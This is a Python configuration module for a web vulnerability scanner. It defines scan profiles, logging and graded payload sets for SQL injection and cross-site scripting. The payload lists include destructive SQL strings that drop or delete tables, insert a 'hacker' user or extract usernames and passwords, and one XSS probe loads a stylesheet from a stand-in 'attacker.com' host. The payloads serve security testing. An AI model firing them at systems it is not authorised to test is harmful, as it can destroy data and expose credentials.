"""
Configuration and profile management for the vulnerability scanner.
Defines scan profiles, logging, and custom payload support.
"""

import logging
import os
from datetime import datetime

# Logging configuration
LOG_DIR = os.path.join(os.path.dirname(__file__), '..', 'logs')
os.makedirs(LOG_DIR, exist_ok=True)

def setup_logger(verbose=False):
    """Setup logger with optional verbose mode."""
    logger = logging.getLogger('scanner')
    logger.setLevel(logging.DEBUG if verbose else logging.INFO)

    # Prevent duplicate logs when setup_logger is called multiple times.
    if logger.handlers:
        for handler in logger.handlers:
            if isinstance(handler, logging.StreamHandler):
                handler.setLevel(logging.DEBUG if verbose else logging.INFO)
        return logger
    
    # Console handler
    console_handler = logging.StreamHandler()
    console_handler.setLevel(logging.DEBUG if verbose else logging.INFO)
    
    # File handler
    log_file = os.path.join(LOG_DIR, f'scan_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log')
    file_handler = logging.FileHandler(log_file)
    file_handler.setLevel(logging.DEBUG)
    
    # Formatter
    formatter = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    console_handler.setFormatter(formatter)
    file_handler.setFormatter(formatter)
    
    logger.addHandler(console_handler)
    logger.addHandler(file_handler)
    
    return logger

# Scan profiles with preset configurations
SCAN_PROFILES = {
    'quick': {
        'name': 'Quick Scan',
        'description': 'Fast scan with limited depth',
        'max_urls': 10,
        'timeout': 5,
        'depth_limit': 1,
        'modules': ['sqli', 'xss'],  # CSRF excluded for speed
        'payloads': 'default',
        'retries': 1,
        'verbose': False
    },
    'standard': {
        'name': 'Standard Scan',
        'description': 'Balanced scan with moderate depth',
        'max_urls': 30,
        'timeout': 8,
        'depth_limit': 2,
        'modules': ['sqli', 'xss', 'csrf'],
        'payloads': 'default',
        'retries': 2,
        'verbose': False
    },
    'full': {
        'name': 'Full Scan',
        'description': 'Comprehensive scan with all checks',
        'max_urls': 100,
        'timeout': 15,
        'depth_limit': 3,
        'modules': ['sqli', 'xss', 'csrf'],
        'payloads': 'extended',
        'retries': 3,
        'verbose': True
    },
    'aggressive': {
        'name': 'Aggressive Scan',
        'description': 'Maximum depth with all payloads',
        'max_urls': 200,
        'timeout': 20,
        'depth_limit': 5,
        'modules': ['sqli', 'xss', 'csrf'],
        'payloads': 'comprehensive',
        'retries': 3,
        'verbose': True
    }
}

# Custom payload sets
PAYLOAD_SETS = {
    'default': {
        'sqli': [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--"
        ],
        'xss': [
            '<script>alert("xss")</script>',
            '<img src=x onerror="alert(1)">',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            '<svg onload=alert(1)>'
        ],
        'csrf': []  # CSRF uses dedicated methods
    },
    'extended': {
        'sqli': [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "admin' --",
            "' OR 'a'='a",
            "1' UNION ALL SELECT NULL--",
            "' AND '1'='1",
            "' AND 1=0 UNION ALL SELECT NULL--",
            "'; EXEC sp_MSForEachTable 'DROP TABLE ?'--"
        ],
        'xss': [
            '<script>alert("xss")</script>',
            '<img src=x onerror="alert(1)">',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            '<svg onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',
            'javascript:alert(1)'
        ],
        'csrf': []
    },
    'comprehensive': {
        'sqli': [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "admin' --",
            "' OR 'a'='a",
            "1' UNION ALL SELECT NULL--",
            "' AND '1'='1",
            "' AND 1=0 UNION ALL SELECT NULL--",
            "'; EXEC sp_MSForEachTable 'DROP TABLE ?'--",
            "' OR ''='",
            "1' OR '1' = '1",
            "' UNION SELECT username, password FROM users--",
            "') OR ('1'='1",
            "1; DELETE FROM users--",
            "'; INSERT INTO users VALUES ('hacker', 'password')--"
        ],
        'xss': [
            '<script>alert("xss")</script>',
            '<img src=x onerror="alert(1)">',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            '<svg onload=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<details open ontoggle=alert(1)>',
            'javascript:alert(1)',
            '<video src=x onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            '<style>@import\'http://attacker.com/xss.css\';</style>',
            '<link rel="stylesheet" href="javascript:alert(1)">',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            '<img src="x" alt="test" title=alert(1)>',
            '"><svg/onload=alert(1)>'
        ],
        'csrf': []
    }
}

def get_profile(profile_name):
    """Get scan profile by name."""
    return SCAN_PROFILES.get(profile_name, SCAN_PROFILES['standard'])

def get_payloads(payload_set='default'):
    """Get payload set by name."""
    return PAYLOAD_SETS.get(payload_set, PAYLOAD_SETS['default'])

def merge_config(profile_name, custom_config):
    """Merge custom config with profile."""
    profile = get_profile(profile_name)
    merged = profile.copy()
    merged.update(custom_config)
    return merged

class ScanConfig:
    """Configuration object for a scan."""
    
    def __init__(self, url, profile='standard', custom_config=None):
        self.url = url
        self.profile_name = profile
        self.profile = get_profile(profile)
        
        # Apply custom config overrides
        if custom_config:
            self.profile.update(custom_config)
        
        # Extract settings
        self.max_urls = self.profile.get('max_urls', 30)
        self.timeout = self.profile.get('timeout', 8)
        self.depth_limit = self.profile.get('depth_limit', 2)
        self.modules = self.profile.get('modules', ['sqli', 'xss', 'csrf'])
        self.payloads = self.profile.get('payloads', 'default')
        self.custom_payloads = custom_config.get('custom_payloads', {}) if custom_config else {}
        self.retries = self.profile.get('retries', 2)
        self.verbose = self.profile.get('verbose', False)
        
        # Get payload set
        self.payload_set = get_payloads(self.payloads)
        
        # Merge custom payloads
        if self.custom_payloads:
            self.payload_set.update(self.custom_payloads)
        
        # Setup logger
        self.logger = setup_logger(self.verbose)
    
    def is_module_enabled(self, module_name):
        """Check if a module is enabled."""
        return module_name in self.modules
    
    def log(self, level, message):
        """Log a message."""
        getattr(self.logger, level)(message)
